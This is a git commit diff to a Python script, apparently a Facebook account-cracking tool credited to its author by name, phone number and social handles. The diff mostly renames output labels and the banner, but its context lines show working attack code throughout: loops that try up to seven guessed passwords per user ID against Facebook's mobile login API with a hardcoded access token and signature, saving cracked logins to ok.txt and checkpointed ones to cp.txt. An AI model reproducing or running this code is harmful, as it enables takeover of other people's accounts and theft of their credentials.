5f8c50b9624f014a8b0a8e7f312105c3c4da69c0
Chidieb <87451270+Chidieb@users.noreply.github.com>
2021-07-30 18:17:59 +0100

    Add files via upload

--- ebere.py
+++ ebere.py
@@ -51,16 +51,7 @@ c2 = "\033[0;97m"
 c3 = "\033[1;31m"
 #MyLogo
 def logo():
-os.system('echo -e
-\033[1;94m ###### #    # # ###### #
-\033[1;92m #      #    # # #    # #
-\033[1;93m #      #    # # #    # #
-\033[1;95m #      ###### # #    # #
-\033[1;94m #      #    # # #    # #
-\033[1;96m #      #    # # #    # # 
-\033[1;97m ###### #    # # ###### #
-\033[1;94m Chidiebere Khan     
------------------------------------------------\n\n鉃� Codded By : Chidi Khan\n鉃� Facebook  : Chidiebere Khan\n鉃� Whatsapp   : +2348109040651\n鉃� Youtube   : Technical Chidi\n\n-----------------------------------------------" | lolcat')
+    os.system('echo -e "\n\nHACKERn\n---------------------------------------\n\n Codded By : Chidi Khan            \n Facebook  : Chidiebere Khan        \n Whatsapp   : +2348109040651        \n Youtube   : Technical Chidi\n\n-----------------------------------------------" | lolcat')
 def method_menu():
     os.system("clear")
     logo()
@@ -306,14 +297,14 @@ def b_menu_select():
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		    d=json.loads(q)
 		    if 'www.facebook.com' in d['error_msg']:
-		        print("[Chidi Checkpoint] "+uid+" | "+pass1)
+		        print("[Chidi CP] "+uid+" | "+pass1)
 		        cp=open("cp.txt","a")
 		        cp.write(uid+" | "+pass1+"\n")
 		        cp.close()
 		        cps.append(uid)
 		    else:
 		    	if "access_token" in d:
-		            print("\x1b[1;92m[Chidi Hacked] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
+		            print("\x1b[1;92m[Chidi OK] \033[1;30m"+uid+" | "+pass1+"\x1b[1;0m")
 		            ok=open("ok.txt","a")
 		            ok.write(uid+" | "+pass1+"\n")
 		            ok.close()
@@ -323,14 +314,14 @@ def b_menu_select():
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		            d=json.loads(q)
 		            if 'www.facebook.com' in d['error_msg']:
-		                print("[Chidi Checkpoint] "+uid+" | "+pass2)
+		                print("[Chidi CP] "+uid+" | "+pass2)
 		                cp=open("cp.txt","a")
 		                cp.write(uid+" | "+pass2+"\n")
 		                cp.close()
 		                cps.append(uid)
 		            else:
 		                if 'access_token' in d:
-		                    print("\x1b[1;92m[Chidi Successfull] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
+		                    print("\x1b[1;92m[Chidi OK] \033[1;30m"+uid+" | "+pass2+"\x1b[1;0m")
 		                    ok=open("ok.txt","a")
 		                    ok.write(uid+" | "+pass2+"\n")
 		                    ok.close()
@@ -340,14 +331,14 @@ def b_menu_select():
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                    d=json.loads(q)
 		                    if 'www.facebook.com' in d['error_msg']:
-		                        print("[Chidi Checkpoint] "+uid+" | "+pass3)
+		                        print("[Chidi CP] "+uid+" | "+pass3)
 		                        cp=open("cp.txt","a")
 		                        cp.write(uid+" | "+pass3+"\n")
 		                        cp.close()
 		                        cps.append(uid)
 		                    else:
 		                        if 'access_token' in d:
-		                            print(" \x1b[1;92m[Chidi Successfull] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
+		                            print(" \x1b[1;92m[Chidi OK] \033[1;30m"+uid+" | "+pass3+"\x1b[1;0m")
 		                            ok=open("ok.txt","a")
 		                            ok.write(uid+" | "+pass3+"\n")
 		                            ok.close()
@@ -357,14 +348,14 @@ def b_menu_select():
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
-		                                print("[Chidi Checkpoint] "+uid+" | "+pass4)
+		                                print("[Chidi CP] "+uid+" | "+pass4)
 		                                cp=open("cp.txt","a")
 		                                cp.write(uid+" | "+pass4+"\n")
 		                                cp.close()
 		                                cps.append(uid)
 		                            else:
 		                                if 'access_token' in d:
-		                                    print("\x1b[1;92m[Chidi Successfull] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
+		                                    print("\x1b[1;92m[Chidi OK] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
 		                                    ok=open("ok.txt","a")
 		                                    ok.write(uid+" | "+pass4+"\n")
 		                                    ok.close()
@@ -374,14 +365,14 @@ def b_menu_select():
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
-		                                        print("[Chidi Checkpoint] "+uid+" | "+pass5)
+		                                        print("[Chidi CP] "+uid+" | "+pass5)
 		                                        cp=open("cp.txt","a")
 		                                        cp.write(uid+" | "+pass5+"\n")
 		                                        cp.close()
 		                                        cps.append(uid)
 		                                    else:
 		                                        if 'access_token' in d:
-		                                            print("\x1b[1;92m[Chidi Successfull] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
+		                                            print("\x1b[1;92m[Chidi OK] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
 		                                            ok=open("ok.txt","a")
 		                                            ok.write(uid+" | "+pass5+"\n")
 		                                            ok.close()
@@ -398,7 +389,7 @@ def b_menu_select():
 		                                                cps.append(uid)
 		                                            else:
 		                                                if 'access_token' in d:
-		                                                    print("\x1b[1;92m[Chidi Successfull] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
+		                                                    print("\x1b[1;92m[Chidi Ok] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
 		                                                    ok=open("ok.txt","a")
 		                                                    ok.write(uid+" | "+pass6+"\n")
 		                                                    ok.close()
@@ -408,14 +399,14 @@ def b_menu_select():
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("[Chidi Checkpoint] "+uid+" | "+pass7)
+		                                                        print("[Chidi CP] "+uid+" | "+pass7)
 		                                                        cp=open("cp.txt","a")
 		                                                        cp.write(uid+" | "+pass7+"\n")
 		                                                        cp.close()
 		                                                        cps.append(uid)
 		                                                    else:
 		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m[Chidi Successfull] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
+		                                                            print("\x1b[1;92m[Chidi OK] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
 		                                                            ok=open("ok.txt","a")
 		                                                            ok.write(uid+" | "+pass7+"\n")
 		                                                            ok.close()
@@ -760,7 +751,7 @@ def l_menu_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;32m[Chidi Successful] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
+				print("\033[1;32m[Chidi OK] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt","a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
@@ -777,14 +768,14 @@ def l_menu_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;32m[Chidi Successful] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
+						print("\033[1;32m[Chidi OK] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt","a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("[Chidi Checkpoint] "+uid+" | "+pass2)
+							print("[Chidi CP] "+uid+" | "+pass2)
 							cp = open("cp.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
@@ -794,14 +785,14 @@ def l_menu_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;32m[Chidi Successful] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
+								print("\033[1;32m[Chidi OK] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt","a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("[Chidi Checkpoint] "+uid+" | "+pass3)
+									print("[Chidi CP] "+uid+" | "+pass3)
 									cp = open("cp.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -811,14 +802,14 @@ def l_menu_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;32m[Chidi Successful] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
+										print("\033[1;32m[Chidi OK] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt","a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print("[Chidi Checkpoint] "+uid+" | "+pass4)
+											print("[Chidi CP] "+uid+" | "+pass4)
 											cp = open("cp.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
@@ -828,14 +819,14 @@ def l_menu_select():
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
-												print("\033[1;32m[Chidi Successful] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
+												print("\033[1;32m[Chidi OK] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt","a")
 												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error"]:
-													print("[Chidi Checkpoint] "+uid+" | "+pass5)
+													print("[Chidi CP] "+uid+" | "+pass5)
 													cp = open("cp.txt","a")
 													cp.write(uid+" | "+pass5+"\n")
 													cp.close()
@@ -845,14 +836,14 @@ def l_menu_select():
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
-														print("\033[1;32m[Chidi Successful] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
+														print("\033[1;32m[Chidi OK] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt","a")
 														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error"]:
-															print("[Chidi Checkpoint] "+uid+" | "+pass6)
+															print("[Chidi CP] "+uid+" | "+pass6)
 															cp = open("cp.txt","a")
 															cp.write(uid+" | "+pass6+"\n")
 															cp.close()
@@ -862,7 +853,7 @@ def l_menu_select():
 															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
 															q = json.loads(data)
 															if "loc" in q:
-																print("\033[1;32m[Chidi Successful] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
+																print("\033[1;32m[Chidi OK] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt","a")
 																ok.write(uid+" | "+pass7+"\n")
 																ok.close()
